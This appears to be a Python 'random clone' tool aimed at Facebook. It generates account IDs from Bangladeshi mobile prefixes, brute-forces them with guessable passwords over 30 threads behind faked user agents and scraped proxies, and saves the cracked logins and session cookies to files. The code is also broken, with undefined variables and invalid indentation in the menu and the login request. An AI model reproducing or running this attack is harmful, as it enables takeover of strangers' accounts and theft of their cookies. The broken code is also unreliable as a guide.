#Sc Make By Asraful Islam Hasan

#Sc Gift By Hasan

#___________Impoet Module____________

import os,sys,time,json,random,re,string,platform,base64,uuid

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from os import system as s

from time import sleep as waktu

#________________Step 2______________

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

#_______________Coler Code_____________

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' 

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' 

M = '\x1b[1;91m' 

H = '\x1b[1;92m' 

K = '\x1b[1;93m' 

B = '\x1b[1;94m' 

U = '\x1b[1;95m' 

O = '\x1b[1;96m' 

N = '\x1b[0m'    

A = '\x1b[1;90m' 

BN = '\x1b[1;107m' 

BBL = '\x1b[1;106m' 

BP = '\x1b[1;105m' 

BB = '\x1b[1;104m' 

BK = '\x1b[1;103m' 

BH = '\x1b[1;102m' 

BM = '\x1b[1;101m' 

BA = '\x1b[1;100m' 

#____________Timedate_____________

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today() 

loop = 0

oks = []

cps = []

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]

#_____________Proxy______________

try:

 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text

 open('.prox.txt','w').write(prox)

except Exception as e:

 print('')

prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):

    a='Nokia'

    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    c=random.randrange(1, 99)

    d='/GoBrowser/'

    e='1.6.0.'

    f=random.randrange(1, 99)

    uaku2=(f'{a}{b}{c}{d}{e}{f}')

    ugen.append(uaku2)

    

def __init__(self):

        self.id = []

        self.ok = []

        self.cp = []

        self.loop = 0

        

logo = ("""\033[1;37m

 

███    ██  █████  ███████ ██ ███    ███ 

████   ██ ██   ██ ██      ██ ████  ████ 

██ ██  ██ ███████ ███████ ██ ██ ████ ██ 

██  ██ ██ ██   ██      ██ ██ ██  ██  ██ 

██   ████ ██   ██ ███████ ██ ██      ██ 

                                        

                                        

                                             

  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                     

\x1b[38;5;196m╔═════════════╗  ࿇⃝🌹⃢𝐍🌹⃝࿇  \033[38;5;46m╔══════════════════╗

\033[38;5;46m║[🔵]\x1b[38;5;196m𝐀𝐔𝐓𝐇𝐎𝐑   ║  ࿇⃝🌹⃢𝐀🌹⃝࿇  \033[38;5;46m║\033[38;5;46m༺𝐍𝐀𝐒𝐈𝐌༻ ║

\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢𝐒🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐌D 𝐍𝐀𝐒𝐈𝐌 𝐌𝐈𝐀༻║

\033[38;5;46m║[🔵]\x1b[38;5;196m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ║  ࿇⃝🌹⃢𝐈🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝟎𝟏𝟕𝟔𝟖𝟓𝟕𝟔𝟗𝟏𝟖༻           ║

\033[38;5;46m║[🔵]\x1b[38;5;196m𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢𝐌🌹⃝࿇  \033[38;5;46m║\033[38;5;46𝐍𝐀𝐒𝐈𝐌𝐁𝐋OG               ║

\033[38;5;46m║[🔵]\x1b[38;5;196m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║  ࿇⃝🌹⃢𝐊⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝟎𝟏𝟕𝟔𝟖𝟓𝟕𝟔𝟗𝟏𝟖༻    ║

\033[38;5;46m║[🔵]\x1b[38;5;196m𝐈𝐌𝐎      ║  ࿇⃝🌹⃢𝐈⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝟎𝟏𝟕𝟔𝟖𝟓𝟕𝟔𝟗𝟏𝟖༻     ║

\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐑𝐎𝐌     ║  ࿇⃝🌹⃢𝐍⃢🌹⃝࿇ \033[38;5;46m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║

\x1b[38;5;196m╚═════════════╝  ࿇⃝🌹⃢𝐆⃢🌹⃝࿇  \033[38;5;46m╚══════════════════╝""")

 

def naima():

	print('-------------------')#_____________Def Main______________ 

def Main():

        os.system("clear")

        print(logo)

        print(f"{WHITE}[01] {WHITE}RANDOM CLONE")

        print(f"{WHITE}[02] {WHITE}OWNER FB ID")

        print(f"{WHITE}[03] {WHITE}OWNER WHATSAPP")

        print(f"{WHITE}[00] {WHITE}EXIT PROGRAM ")

        Sumaiya =input("\n [?] Choose : ")

        if hamii in ["1","01"]:

        os.system("xdg-open https://www.facebook.com/mdnasimmia44")

         password()

         elif hamii in ["2","02"]:

        os.system("xdg-open https://www.facebook.com/mdnasimmia44");xyz()

        elif hamii in ["3","03"]:

        os.system("xdg-open https://wa.me/+8801768576918")

        xyz()    

        elif hamii in ["0","00"]:

        exit()

        else:

            exit()

#______________Def Sc__________            

def fuck():

    user=[]

    os.system('clear')

    print(logo)

    print('[×] Exm: 019, 016, 017, 018, 014, 014')

    code = input('[?] Choice Your Code : ')

    name = ''.join(random.choice(string.digits) for _ in range(2))

    cod = ''.join(random.choice(string.digits) for _ in range(2))

    os.system('clear')

    print(logo)

    print('[×] Exm: 2000 3000 5000 10000 ')

    limit = int(input('[?] Choice Your Liimit : '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(4))

        user.append(nmp)

    with ThreadPool(max_workers=30) as asha:

        os.system('clear')

        print(logo)

        tl = str(len(user))

        print('[×] Total ids: '+tl)

        print("[×] Your Code: "+code)

        print('[×] Airplne Moode On/Off')

        print('[×] Process has been started')

        print('-------------------')

        for love in user:

            uid = code+name+cod+love

            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']

            asha.submit(hasan,uid,pwx,tl)

    print('-------------------')

    print(' [✓] Crack process has been completed')

    print(' [✓] OK Ids saved as 𝐍𝐀𝐒𝐈𝐌-OK.txt')

    print(' [✓] CP Id Save as 𝐍𝐀𝐒𝐈𝐌-CP.txt')

    print('-------------------')

def hasan(uid,pwx,tl):

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            sys.stdout.write('\r[𝚃𝙰𝙷𝙴𝙳𝚄𝙻]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),

            sys.stdout.flush()

            free_fb = session.get('https://mbasic.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            #_____Mathoid______#

            headers = {'authority': 'mbasic.facebook.com',

    'method': 'GET',

    'scheme': 'https',

    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',

    'cache-control': 'max-age=0',

    'referer': 'https://www.google.com/',

    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',

    'sec-ch-ua-mobile': '?1',

    'sec-ch-ua-platform': '"Android"',

    'sec-fetch-dest': 'document',

    'sec-fetch-mode': 'navigate',

    'sec-fetch-site': 'cross-site',

    'sec-fetch-user': '?1',

    'upgrade-insecure-requests': '1',

    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}

            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[7:22]

                print(f"[𝚃𝙰𝙷𝙴𝙳𝚄𝙻-OK] {uid}|{ps} \nCookie : {coki}")

                open('/sdcard/𝚃𝙰𝙷𝙴𝙳𝚄𝙻-OK.txt', 'a').write( uid+' | '+ps+'\n')

                oks.append(uid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[82:97]

                print(f"[𝚃𝙰𝙷𝙴𝙳𝚄𝙻-CP] {cid}|{ps}")

                open('/sdcard/𝚃𝙰𝙷𝙴𝙳𝚄𝙻-CP.txt', 'a').write( uid+' | '+ps+' \n')

                cps.append(uid)

                break

            else:

                continue

        loop+=1

    except:

        pass

        

Main()
